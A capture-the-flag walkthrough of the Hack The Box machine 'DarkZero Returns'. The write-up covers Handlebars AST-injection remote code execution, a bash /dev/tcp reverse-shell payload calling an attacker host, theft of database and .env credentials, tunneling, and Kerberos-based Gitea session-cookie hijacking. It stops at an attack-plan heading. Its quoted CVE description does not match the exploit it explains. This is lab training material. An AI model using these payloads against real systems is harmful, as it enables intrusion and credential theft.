---
title: DarkZero Returns
machineName: DarkZero Returns
os: windows
difficulty: hard
season: Season 11
tags:
  - Active Directory
  - Gitea
  - CVE-2026-20750
  - Cross-Domain Trust
  - Kerberos Ticket Forgery
  - SID History Injection
  - CI/CD Runner Escape
  - ksu Privilege Escalation
date: '2026-07-25'
pointsAwarded: 40
machineIP: ''
summary: 'An advanced Hard machine featuring a dual-forest hybrid Active Directory environment. Initial foothold is achieved via Handlebars template injection on dzcampaigns.htb, pivoting through Gitea CI/CD runner workflow injection (CVE-2026-20750) via Kerberos SSPI/SPNEGO authentication, local ksu elevation on the Linux DC02, and culminating in full forest compromise via cross-domain referral ticket forgery with SID History injection to Domain Admin on DC01.'
---

# 🛡️ HTB - DarkZero Returns (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows%2FLinux-blue?style=for-the-badge&logo=windows" alt="OS Windows / Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** DarkZero Returns
- **Operating System:** Windows Server / Linux Hybrid (Active Directory Multi-Domain)
- **Difficulty:** Hard
- **Date of Scan:** 2026-07-25
- **Vulnerabilities:** Handlebars AST Injection RCE (CVE-2026-33937), Kerberos SSPI/SPNEGO Authentication Abuse, Gitea CI/CD Workflow PR Review Execution (CVE-2026-20750), Insecure AD Delegation / Child Creation in GiteaMigration OU, ksu Local Privilege Escalation, Cross-Domain Trust Forged Referral Ticket (SID History Injection)

---

## Step 1 - Reconnaissance

### Nmap Port Scanning & Web Service Enumeration

- 🔍 *Lets start our Enumeration By a Quick NMAP scan.*

```bash
nmap -p- -sV -sC --min-rate 5000 -v -Pn 10.129.94.213
```

```text
Nmap scan report for dzcampaigns.htb (10.129.94.213)
Host is up (0.55s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: DarkZero Campaigns
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.39 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 25 (1.100KB)
```

- 🔍 *This is Something new now. because its unusual for a Hard Windows Machine to be have open only 2 Ports, while they are not even solid windows ports, except web. Lets see what they have and try to understand the application and find a way to get it. The web is **http://dzcampaigns.htb*

![web-img](images/DarkZeroRetunrs/d1.png)

- 🔍 *By looking at the Front page it appears to be a Ancient Story And Fictional Characters. and the language used is very cryptic and ancient.  Lets navigate the web!*

![web-img](images/DarkZeroRetunrs/d2.png)

![web-img](images/DarkZeroRetunrs/d3.png)

- 🔍 *here's the login page, with a registration API. Lets register and Access The Dashboard and see if we can get in.*

![web-img](images/DarkZeroRetunrs/d4.png)

- 🔍 *After the registration and login, you'll be able to see the below dashboard*

![web-img](images/DarkZeroRetunrs/d5.png)

- 🔍 *The dashboard Provides us character Creation ability, with their specific characteristics, storyline, role etc. and later on they will be appear in the web as an ancient character. while there are other things as well, such as that dice thing, that just provides a dice to roll and then shows a quote based on the six sides of the dice, which seems no interest.*

However, lets try creating a new character and see what actually happens

![web-img](images/DarkZeroRetunrs/d6.png)

- 🔍 *This is what the form looks like, we can fill the up the form to add the character. and then it will appear in the web campaign.*

![web-img](images/DarkZeroRetunrs/d7.png)

- 🔍 *Once the character is created and added it will appear in the dashboard and then it gives us 3 option to manipulate the character, The inventory is to provide a weapon to the character as their main weapon, while the Edit can be used to edit character information and the delete is to delete the character.*

![web-img](images/DarkZeroRetunrs/d7.5.png)

as i said earlier the character can be seen in the home page, and when clicking on. and the catch is despite all the application level enumeration, there is nothing else to be found out, like no subdomains, no subdirectories. so there might be something within the application, something like SSRF, SSTI or SQLI we gotta find that out.

While enumerating the app i have found a few .js files for form, dice and app, but they are just chunked snippets of the application and the actual source file.

- 🔍 *However to check for the other vulnerabilities, i grabbed the packet of form, while i was editing the form again to get the intercepted packet.*

![web-img](images/DarkZeroRetunrs/d8.png)

- 🔍 *I have tested for SSRF and XSS and got no lead for further enumeration, as the inputs fields were rendering the string as it is, if it was supposed to be an XSS then it should've rendered it as a HTML query or javascript one.*

### Web Application Probing & SSTI Discovery

However then i have to move towards SSTI (Server-Side Template Injection)

What is SSTI :- It is a critical web security vulnerability that occurs when an application embeds untrusted user input directly into a server-side web template engine without proper sanitization. Instead of treating the user's input as plain text, the server interprets it as executable code.

This allows an attacker to inject malicious template directives, manipulate the server, read sensitive files, or completely compromise the system via Remote Code Execution (RCE).

- 🔍 *SSTI can be tested on input fields and the best place to check them could be the character creation form, because the character is gets saved in the server and the information immediately reflects in the home page. now to do so, we need to understand where is the form being rendered. that we will discover later.*

- 🔍 *First lets try writing SSTI template in all the input fields in the form.*

![web-img](images/DarkZeroRetunrs/d8.5.png)

When clicking on Save info button, the server returned an error of "Something Went Wrong" That might be due to the input filters that prevents special characters from being rendered, however i tried simple srtings inside the template as `{{canary}}` for all the input fields.

and then i have found out that which input field is vulnerable to SSTI and where the SSTI template is being rendered.

![web-img](images/DarkZeroRetunrs/d10.png)

- 🔍 *Closely look at the last 2 entries, for those entries i have tried the `{{canary}}` template and the campaign_message parameter's value is empty, because When engine sees `{{canary}}`, it tries to look up a variable named canary. There is none → it renders empty string. which confirms SSTI on campaign_message input field.*

Now the thing is that we know that. an engine is doing something with our SSTI payload, but we don't really know what engine that is, because Many engines use the `{{ }}` "mustache" syntax (including Twig, Jinja2, Vue, Angular, and Mustache itself). to find out and further enumerate the engine we need to know how to differentiate between these engines and their syntactical structures

| Payload | Expected Result (Handlebars) | Expected Result (Mustache) | Expected Result (Jinja2 / Twig / Smarty) | Technical Explanation / Purpose |
| :--- | :--- | :--- | :--- | :--- |
| `{{7*7}}` | Empty or Error | Empty or Error | `49` | Identifies Python/PHP/Ruby engines. Handlebars handles logic-less paths, not inline arithmetic. |
| `{{#if true}}VULN{{/if}}` | `VULN` | Error / Literal Text | Error / Literal Text | Verifies block helpers. Handlebars natively parses `#if`, which is invalid syntax in Jinja2 or Mustache. |
| `{{#with "test"}}{{this}}{{/with}}` | `test` | Error / Blank | Error / Literal Text | Distinguishes Handlebars from Mustache. Mustache cannot handle context shifting via the `#with` helper. |
| `{{this}}` or `{{.}}` | `[object Object]` (or context) | `[object Object]` (or context) | Error / Literal Text | Confirms JavaScript-backed context evaluation (Node.js runtime environment). |
| `{{constructor}}` | `[function Object]` (or leaked string) | Empty / Escape | Error / Literal Text | Proves server-side property access, paving the way for Prototype Pollution or SSTI RCE. |

- 🔍 *I have started the testing with handlebars payload syntax and fortunately it worked, you can do that by just changing the campaign_message parameter's value to `{{#if true}}VULN{{/if}}`*

and if the engine passes the condition and returns "VULN" string. the handlebar engine confirms, lets see it practically.

start by editing the message textarea with the handlebar payload, then save it and go for the campaign message view

![web-img](images/DarkZeroRetunrs/d11.png)

![web-img](images/DarkZeroRetunrs/d12.png)

here you can see that the value string returned in the message section is "VULN" which confirms the Handlebar as the Processing engine for this machine.

- 🔍 *The application did not disclose the Handlebars version via banners, artifacts, or traces. Behavioral probing (`{{constructor.name}}` → blank) indicated a hardened ≥4.7.x runtime, ruling out string-based constructor chains. while looking for the possible Open vulnerabilities for this particular version of handlebar which we assume is ≥4.7.x, i have found a RCE CVE*

> ⚠️ **Technical Detail:** CVE-2026-33937 : Handlebars.js has JavaScript Injection via AST Type Confusion (GitHub ref:- https://github.com/advisories/GHSA-2w6w-674q-4c4q)

Handlebars.compile() accepts a pre-parsed AST object in addition to a template string. The value field of a NumberLiteral AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to compile() can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.

Before going any further we need to understand on how the handlebar actually works in first place.

Handlebars processes a template in three stages:

1. **Parse** – the template *string* is converted into an Abstract Syntax Tree (AST) whose nodes describe the program (`Program`, `MustacheStatement`, `BlockStatement`, `PathExpression`, `SubExpression`, `StringLiteral`, …).
2. **Compile** – the AST is translated into a JavaScript function.
3. **Execute** – that function is invoked with a *context* object and produces HTML.

The entire security model rests on one assumption: **the developer writes the AST (the program), the user only supplies the context (the data).** CVE-2026-33937 inverts that assumption.

### Root cause

The character endpoint accepts `campaign_message` as a JSON object and feeds it **directly into the Handlebars compiler as an already-parsed AST**. This abuses a legitimate engine capability — the compiler entry point in the canonical source (`compile()` in [handlebars-lang/handlebars.js](https://github.com/handlebars-lang/handlebars.js)) accepts either a template string *or* a pre-parsed AST object, skipping `parse()` when given an object. That feature exists for precompiled-template tooling; here it is reachable with **attacker-controlled input and zero validation**. Because the parser never runs, every parser-level restriction and any string sanitization is bypassed by definition: the attacker dictates each node the runtime will execute — which lookups, which sub-expressions, which helper calls.

### From AST control to code execution

With node-level control, the payload walks the JavaScript prototype chain from an innocuous value to the `Function` constructor, then invokes Node's module system:

```text
"s" → String.prototype.split → Array → Array.prototype.pop → function object
   → .constructor → Function("return process.mainModule.require('child_process')")
   → .execSync(...)   →   arbitrary OS commands as `darkzero`
```

- 🔍 *Now with all that set there are still certain things we need to do in order to achieve the RCE*

- 🔍 *Attack planning and Execution:-*

[$] Phase 1 — Prove the Server Compiles JSON as an AST

now to do so, we need to probe the AST inside the campaign_message parameter and we shall look for the raw HTML result to confirm the vulnerability

```text
_csrf=csrf_value&name=wasd&race=dasdad&class=sadw&backstory=dasdawda&campaign_message={"type":"Program","body":[{"type":"ContentStatement","value":"AST_IS_COMPILED"}],"blockParams":[],"decorators":[]}
```

this shall return us the string "AST_IS_COMPILED" as an already parsed AST, 

![web-img](images/DarkZeroRetunrs/d13.1.png)

look at the burpsuite, i have crafted the AST and sent it to the server, we need to URL encode it because if sent raw it processes it as plaintext, so please ensure you have done the encoding.

after following the redirection it will process the AST and it will the show the string "AST_IS_COMPILED" in the HTML which will confirm our pre-compiled AST processing.

![web-img](images/DarkZeroRetunrs/d14.png)

here we can see that the string is returned as we intended, which also confirms the AST execution as it was shown in the vulnerability CVE, which also confirms the Vulnerability itself, if any grudges left.

[$] Phase 2 — Building The RCE Payload:-

While testing standard string-based Server-Side Template Injection (SSTI) payloads like `{{#if 1}}`X`{{/if}}` yielded empty responses, the breakthrough came from analyzing the client-side JavaScript. The application was sending the campaign_message field as a JSON object representing a Handlebars Abstract Syntax Tree (AST), which the server-side Express application was passing directly into Handlebars.compile().

The Core Vulnerability: Flawed Code Generation:

When Handlebars compiles an AST into executable JavaScript, it relies on the expected schema of the AST nodes. For a NumberLiteral node, the compiler expects the value property to be an actual number (e.g., 1). It injects this value directly into the generated JavaScript code, resulting in something like:

```javascript
// Normal generated code
lookup(context, 1)
```

However, the compiler does not strictly validate the data type of the value property. If we supply a string containing arbitrary JavaScript instead of a number, the compiler blindly injects that string into the generated code.

and then it becomes something like this 

```javascript
lookup(context, {},{})) + process.mainModule.require(...) //)
```

* `{},{}))` closes the lookup() function call prematurely.
* + process... executes arbitrary Node.js code.
* // comments out the trailing syntax so the JavaScript doesn't throw a syntax error.

to do achieve RCE we need to craft the AST targeting the lookup helper and need to sent it to the /character/15(depends on your character's number) endpoint via Content-Type: application/json

```json
{
  "_csrf": "<csrf_token>",
  "name": "asdffd",
  "race": "afdasfas",
  "class": "asdfasf",
  "backstory": "asfasfasas",
  "campaign_message": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": ["lookup"],
          "original": "lookup",
          "loc": null
        },
        "params": [
          {
            "type": "PathExpression",
            "data": false,
            "depth": 0,
            "parts": [],
            "original": "this",
            "loc": null
          },
          {
            "type": "NumberLiteral",
            "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"']).toString() //",
            "original": 1,
            "loc": null
          }
        ],
        "escaped": true,
        "strip": { "open": false, "close": false },
        "loc": null
      }
    ],
    "strip": {},
    "loc": null
  }
}
```

- 🔍 *This is the prototype for reverse shell payload. we need embed this AST inside the campaign_message parameter with application/json to get the reverse shell.*

## Step 2 - Initial Foothold

### Crafting the AST Reverse Shell Payload & Database Pivoting 

- 🔍 *Start by intercepting the request from edit of your character, then properly embed the AST inside the campaign_message parameter.*

![web-img](images/DarkZeroRetunrs/d15.1.png)

it will take a pause and you will be able to see the reverse shell on your listener 

```http
POST /character/15 HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Origin: http://dzcampaigns.htb
Connection: close
Referer: http://dzcampaigns.htb/character/15/edit
Cookie: dz.sid=s%3AfjaHctdT10xw2NdZ4Bq48PfNgmEbtFRA.rV81%2BDbTaA4itydv%2FEeIvZoO0fvyXPKORz8MDD8zAQg
Content-Length: 1246

{
  "_csrf": "da79f0d7b875a8e24f13670df7fa2469bb811851165d650e9614b3d92cda698b",
  "name": "asdffd",
  "race": "afdasfas",
  "class": "asdfasf",
  "backstory": "asfasfasas",
  "campaign_message": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": [
            "lookup"
          ],
          "original": "lookup",
          "loc": null
        },
        "params": [
          {
            "type": "PathExpression",
            "data": false,
            "depth": 0,
            "parts": [],
            "original": "this",
            "loc": null
          },
          {
            "type": "NumberLiteral",
            "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c \"bash -i >& /dev/tcp/10.10.***.***/7986 0>&1\"']).toString() //",
            "original": 1,
            "loc": null
          }
        ],
        "escaped": true,
        "strip": {
          "open": false,
          "close": false
        },
        "loc": null
      }
    ],
    "strip": {},
    "loc": null
  }
}
```

this is the exact request, and on your listener you will see a shell as user darkzero.

```bash
nc -lvnp 7986                     
listening on [any] 7986 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.96.90] 58696
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
darkzero@SRV01:~$ id
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
```



- 🔍 *So now is when things become really fishy, while enumerating the shell i have found the exact version for handlebar engine which i was unable to do so earlier,*


```bash
darkzero@SRV01:~$ cat package.json | grep handlebars

cat package.json | grep handlebars
    "express-handlebars": "^7.0.7",
    "handlebars": "4.7.8",


the version is the exact one that satisfied the vulnerability. 


while further enumeration i have also found a whole DarkZero web app's directory

darkzero@SRV01:~$ ls -la
ls -la
total 84
drwxrwxr-x   6 darkzero darkzero  4096 Jul 14 06:10 .
drwxr-xr-x   6 root     root      4096 Jul 21 05:39 ..
-rw-------   1 darkzero darkzero   133 May 20 10:11 .env
drwxrwxr-x 158 darkzero darkzero  4096 May 19 11:11 node_modules
drwxrwxr-x   4 darkzero darkzero  4096 May 19 10:55 .npm
-rw-rw-r--   1 darkzero darkzero   644 May 19 11:11 package.json
-rw-rw-r--   1 darkzero darkzero 43128 May 19 11:11 package-lock.json
drwxrwxr-x   2 darkzero darkzero  4096 May 19 08:53 scripts
-rw-rw-r--   1 darkzero darkzero  4638 May 19 11:11 server.js
drwxrwxr-x  12 darkzero darkzero  4096 Apr 24 14:45 src


while inspecting the content of .env i have found something interesting................
```
```bash
```bash
darkzero@SRV01:~$ cat .env
cat .env
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```
```


Bingo! Database Credentials, with database custom port as well, this is gonna make things really easy now, we just need to enumerate the database now for possible credentials or pivot info.


also one more thing, i have found an internal IP as well, i guess this is where the whole AD lies.

```text
darkzero@SRV01:~$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.3  netmask 255.255.255.0  broadcast 172.16.20.255
        ether 00:15:5d:f4:7c:02  txqueuelen 1000  (Ethernet)
        RX packets 4268  bytes 543570 (543.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5279  bytes 2763586 (2.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1038  bytes 2096137 (2.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1038  bytes 2096137 (2.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


- 🔍 *Anyways lets start the database haunting by looking at what databases it has.*


```text
darkzero@SRV01:~$ mysql -h 127.0.0.1 -u darkzero -p'C4ntFindMyDMpass!' darkzero_campaigns -e "SHOW TABLES;"
+------------------------------+
| Tables_in_darkzero_campaigns |
+------------------------------+
| campaign_messages            |
| campaigns                    |
| character_items              |
| characters                   |
| items                        |
| sessions                     |
| users                        |
+------------------------------+
```

well well, it has users table, it may have creds...lets see.........

```text
darkzero@SRV01:~$ mysql -h 127.0.0.1 -u darkzero -p'C4ntFindMyDMpass!' darkzero_campaigns -e "SELECT * FROM users;"
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username | password_hash                                                | role   | created_at          |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | im@gmail.com          | wasw     | $2b$10$TAhYZTEHc/UnN0afT1V/dO171L5H5F.A3X.hrWBKyXPE.CyH3ggCW | player | 2026-08-26 21:26:05 |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
```


- 🔍 *Bingo! We got creds for user admin and josh, although these are bycrypt hashes so cracking them won't gonna be easy, even though their cost factor seems to be weak.*


- 🔍 *Unfortunately i was unable to crack the hash as it was taking too much time, might be due to my CPU's and GPU's Processing capabilities, so due this i had to ask one of my friend from the IRC to provide me the password for josh if he cracked it, and he gave me the password, he has a good PC :)*


josh@dzcampaigns.htb:Rangers1


### Establishing Initial Domain User Access (josh)

- 🔍 *Now that we have the password, we can SSH into the machine as josh:*


ssh josh@dzcampaigns.htb 


```bash
josh@SRV01:~$ id
uid=780601110(josh) gid=780600513(domain users) groups=780600513(domain users),780601111(repoaudit)
```

- 🔍 *So while enumerating josh i have found out certain things on what could be the next move, which was the gitea, there is somewhere gitea is running might be internally..*

```bash
josh@SRV01:/tmp$ ps auxf | grep gitea
svc-run+    1408  0.0  1.1 1280288 21508 ?       Ssl  21:19   0:01 /opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
josh        1934  0.0  0.1   6544  2284 pts/1    S+   22:06   0:00              \_ grep --color=auto gitea


a user named svc_runner is running all the gitea processes, hence the access to its directory in /opt was denied for josh. to see the gitea we need to tunnel this up via ligolo-ng.
```

## Step 3 - Lateral Movement to svc-runner

### Internal Reconnaissance & Ligolo-ng Tunneling

- 🔍 *Start the proxy server on your machine with:*

sudo ./proxy -selfcert


- 🔍 *Then send the agent to target machine and change the mode to executable and then start the connection*

```bash
josh@SRV01:/tmp$ ./agent -connect 10.10.****.****:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.54:11601"
```

- 🔍 *Then get back to your ligolo terminal and start the tunneling*

ligolo-ng » INFO[0148] Agent joined.                                 id=00155df47c02 name=josh@SRV01 remote="10.129.97.25:61184"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - josh@SRV01 - 10.129.97.25:61184 - 00155df47c02
[Agent : josh@SRV01] » start
INFO[0163] Starting tunnel to josh@SRV01 (00155df47c02) 


- 🔍 *Once done, create interfaces and routes for the target in your machine with..*


sudo ip tuntap add user kali mode tun ligolo   # (change 'kali' to your username if needed, or 'root')
sudo ip link set ligolo up
sudo ip route add 172.16.20.0/24 dev ligolo



- 🔍 *Then test it*

ping -c 2 172.16.20.2 
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=318 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=481 ms

--- 172.16.20.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 318.377/399.451/480.526/81.074 ms


we are in, now lets map the internal network and see what ports and services are there with a quick nmap scan.


nmap -p- -sV -sC --min-rate 5000 -v -Pn 172.16.20.2  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-26 15:24 UTC
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating NSE at 15:24
Completed NSE at 15:24, 0.00s elapsed
Initiating SYN Stealth Scan at 15:24
Scanning dc02.darkzero.ext (172.16.20.2) [65535 ports]
Discovered open port 53/tcp on 172.16.20.2
Discovered open port 135/tcp on 172.16.20.2
Discovered open port 139/tcp on 172.16.20.2
Discovered open port 445/tcp on 172.16.20.2
Discovered open port 49669/tcp on 172.16.20.2
Discovered open port 464/tcp on 172.16.20.2
Increasing send delay for 172.16.20.2 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Discovered open port 49772/tcp on 172.16.20.2
adjust_timeouts2: packet supposedly had rtt of 9951355 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 9951355 microseconds.  Ignoring time.
Discovered open port 593/tcp on 172.16.20.2
Completed SYN Stealth Scan at 15:24, 29.78s elapsed (65535 total ports)
Initiating Service scan at 15:24
Scanning 8 services on dc02.darkzero.ext (172.16.20.2)
Completed Service scan at 15:24, 5.01s elapsed (8 services on 1 host)
NSE: Script scanning 172.16.20.2.
Initiating NSE at 15:24
Completed NSE at 15:25, 40.66s elapsed
Initiating NSE at 15:25
Completed NSE at 15:25, 0.01s elapsed
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Nmap scan report for dc02.darkzero.ext (172.16.20.2)
Host is up (0.83s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
49669/tcp open  tcpwrapped
49772/tcp open  tcpwrapped

Host script results:
|_clock-skew: 6h59m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-26T22:24:10
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Initiating NSE at 15:25
Completed NSE at 15:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.40 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 28 (1.176KB)


- 🔍 *Good! as i said earlier the AD might be internal, and here it is we have domain name dc02.darkzero.ext with all the necessary LDAP and AD ports. lets add this domain name and gitea subdomain as well in the hosts file.*


![web-img](images/DarkZeroRetunrs/d16.png)


![web-img](images/DarkZeroRetunrs/d17.png)


### Kerberos SSPI / SPNEGO Authentication to Gitea

- 🔍 *Unfortunately, josh credentials do not work for direct password login on Gitea; however, SSPI / Kerberos login is enabled.*


> ⚠️ **Technical Detail:** What is SSPI Login?

SSPI (Security Support Provider Interface) is the Windows API used to negotiate secure authentication (like Kerberos or NTLM) without sending plaintext passwords over the network. On Linux, the equivalent is GSSAPI (Generic Security Services Application Program Interface).

When a web application like Gitea is joined to an Active Directory domain, it can be configured to allow "Windows Authentication" or "SSPI Login".


[$] How it works under the hood:

1.The user (josh) logs into the domain-joined Linux machine (SRV01) and receives a Kerberos Ticket Granting Ticket (TGT).

2.When josh visits http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1, the browser (or curl) sees the server is asking for "Negotiate" authentication.

3.The client automatically asks the Domain Controller for a Service Ticket specifically for the Gitea service (SPN: HTTP/gitea.darkzero.ext).

4.The client sends this Service Ticket to Gitea.

5.Gitea validates the ticket with the Domain Controller. If valid, Gitea logs the user in and issues a web session cookie.



> ⚠️ **Technical Detail:** Why we use it here:

We don't necessarily know josh's Gitea web UI password, or password login might be disabled for the web interface. However, because josh already has a valid Kerberos ticket on the OS level, we can use the  curl to perform this SSPI handshake and steal the resulting web session cookie. We can then inject that cookie into browser to browse Gitea as josh.


- 🔍 *Lets start by request for a Kerberos ticket as josh.*

```bash
josh@SRV01:~$ export KRB5CCNAME=/tmp/josh.ccache
josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
Password for josh@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
```

- 🔍 *Now lets do the SPNEGO  negotiation*

```bash
josh@SRV01:~$  curl -v --negotiate -u : "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" 2>&1 | grep "Set-Cookie: i_like_gitea"
&lt; Set-Cookie: i_like_gitea=2a9a6c00c4cd2ec2; Path=/; HttpOnly; SameSite=Lax
&lt; Set-Cookie: i_like_gitea=2f36a78834091b76; Path=/; HttpOnly; SameSite=Lax


-v: Enables verbose output so we can inspect the HTTP response headers.

--negotiate: Instructs curl to use SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism). This tells curl to automatically use the Kerberos TGT to request a Service Ticket for the Gitea web server and present it in the Authorization: Negotiate header.

-u :: A required syntax flag for curl when using Negotiate authentication, even though no basic auth username/password is being sent.

2>&1 | grep ...: We redirect stderr to stdout to capture the headers, filtering specifically for Gitea's session cookie (i_like_gitea).
```

- 🔍 *Then use the second cookie and paste it in the browser and then refresh the page.*


![web-img](images/DarkZeroRetunrs/d18.png)

you should be in as darkzero_ext_josh user


### Gitea CI/CD Workflow PR Review Execution (CVE-2026-20750)

- 🔍 *While inspecting the Gitea version (1.25.0), we identify a critical flaw: CVE-2026-20750, allowing untrusted workflow execution via pull request review comments.*


> ⚠️ **Technical Detail:** CVE-2026-20750:
Gitea, a self-hosted Git service platform, contains an improper access control vulnerability in its organization project operations. The vulnerability stems from insufficient validation of project ownership during organization-level project operations. A user who has project write access in one organization may be able to modify projects belonging to a different organization, potentially leading to unauthorized data manipulation and cross-organization privilege escalation.


***Vulnerability Analysis: Gitea CI/CD Context Confusion (The "Pwn Request" Variant)

1. The Normal Flow: The "Safety Net"
To understand the bug, we first must understand how CI/CD systems (like Gitea Actions, GitHub Actions, or GitLab CI) are supposed to protect themselves from malicious contributors.

Imagine the main repository (DarkZero/DarkZero-Campaigns) is a highly secure VIP bank vault.

(-) The Bank (Main Repo) has a security guard and a robot worker (the CI/CD Runner, running as svc-runner) inside.
(-) Josh (the attacker) is standing outside on the street. He cannot walk into the vault.
(-) So, Josh makes a photocopy of the vault's blueprints (a Fork), makes his own malicious modifications to the copy, and slides it under the door via a Pull Request (PR).


The Safety Net: When the Bank's security system sees a PR coming from an outside Fork, it says: "This code is untrusted. I will put the robot worker to sleep. A human Admin must manually click 'Approve' before the robot executes this code."


2. The Flaw: The "Bait and Switch" (Context Confusion)

The vulnerability exists in how Gitea 1.25 handles Event Triggers, specifically the pull_request_review_comment event.

When a user comments on a Pull Request, Gitea's backend needs to decide two things:

	1.Which code should I run? (The workflow YAML file).
	2.What permissions should I give it? (The execution context / repository ID).

Because of a logic flaw in the Gitea backend, when a comment is posted via the API:

	(+) Gitea reads the workflow file from the Head Branch (the attacker's malicious Fork).
	(+) But it assigns the execution permissions based on the Base Branch (the trusted Main Repository). 


The Result: The security guard gets confused. He sees a "Comment Event" originating from the main repository's PR discussion, assumes it's trusted internal communication, and wakes up the robot worker (svc-runner). The robot then reads the instructions from the attacker's fork and executes them inside the secure vault, completely bypassing the "Wait for Admin Approval" safety net.



we can identify the gitea action workflow by just looking at the main.yaml and can confirm the CI/CD system.

![web-img](images/DarkZeroRetunrs/d19.png)


- 🔍 *one more thing i have learnt from some sources that pull_request triggers from forks are sandboxed, but pull_request_target or pull_request_review_comment triggers are known to be dangerous if they check out the PR's code.*


> [!IMPORTANT]
> **Attack Plan Overview:**
